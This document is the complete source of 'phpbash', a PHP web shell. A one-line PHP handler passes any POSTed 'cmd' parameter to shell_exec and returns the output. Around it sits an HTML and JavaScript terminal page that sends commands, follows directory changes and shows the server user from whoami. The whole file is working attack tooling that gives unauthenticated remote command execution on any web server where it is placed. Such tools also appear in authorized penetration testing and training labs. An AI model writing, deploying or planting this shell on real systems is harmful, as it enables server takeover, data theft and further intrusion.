<?php /* phpbash by Alexander Reid (Arrexel) */ if (ISSET($_POST['cmd'])) { echo shell_exec($_POST['cmd']." 2>&1"); die(); } ?>

<html>
    <head>
        <title></title>
        <style>
            body {
                width: 100%;
                height: 100%;
                margin: 0;
                background: #000;
            }
            
            body, .inputtext {
                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                font-size: 14px;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                line-height: 20px;
                overflow: hidden;
            }
        
            .console {
                width: 100%;
                height: 100%;
                margin: auto;
                position: absolute;
                color: #fff;
            }
            
            .output {
                width: auto;
                height: auto;
                position: absolute;
                overflow-y: scroll;
                top: 0;
                bottom: 30px;
                left: 5px;
                right: 0;
                line-height: 20px;
            }
            
            .input, .input form, .inputtext {
                width: 100%;
                height: 30px;
                position: absolute;
                bottom: 0px;
                margin-bottom: 0px;
                background: #000;
                border: 0;
            }
            
            .input form, .inputtext {
                width: 100%;
                display: inline-block;
            }
            
            .username {
                height: 30px;
                width: auto;
                padding-left: 5px;
                display: inline-block;
                line-height: 30px;
            }

            .input {
                border-top: 1px solid #333333;
            }
            
            .inputtext {
                padding-left: 8px;
                color: #fff;
            }
            
            .inputtext:focus {
                outline: none;
            }

            ::-webkit-scrollbar {
                width: 12px;
            }

            ::-webkit-scrollbar-track {
                background: #101010;
            }

            ::-webkit-scrollbar-thumb {
                background: #303030; 
            }
        </style>
    </head>
    <body>
        <div class="console">
            <div class="output" id="output"></div>
            <div class="input">
                <div class="username" id="username"></div>
                <form id="form" method="GET" onSubmit="sendCommand()">
                    <input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                </form>
            </div>
        </div>
        <script type="text/javascript">
            var username = "";
            var currentDir = "";
            getShellInfo();
            
            function getShellInfo() {
                var request = new XMLHttpRequest();
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
                        username = parsedResponse[0];
                        currentDir =  parsedResponse[1];
                        
                        document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
                    }
                };

                request.open("POST", "", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("cmd=whoami; pwd");
            }
                        
            function sendCommand() {
                var request = new XMLHttpRequest();
                var command = document.getElementById('inputtext').value;
                var originalCommand = command;
                var originalDir = currentDir;
                var outputElement = document.getElementById("output");
                var cd = false;
                
                document.getElementById('inputtext').value = "";

                var parsedCommand = command.split(" ")[0];
                if (parsedCommand == "cd") {
                    cd = true;
                    command = "cd "+currentDir+"; "+command+"; pwd";
                } else if (parsedCommand == "clear") {
                    outputElement.innerHTML = "";
                    return false;
                } else {
                    command = "cd "+currentDir+"; " + command;
                }
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        if (cd) {
                            var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
                            currentDir = parsedResponse[parsedResponse.length-2];
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                            document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
                        } else {
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
                            outputElement.scrollTop = outputElement.scrollHeight;
                        } 
                    }
                };

                request.open("POST", "", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("cmd="+command);
                return false;
            }
            
            document.getElementById("form").addEventListener("submit", function(event){
                event.preventDefault()
            });
        </script>
    </body>
</html>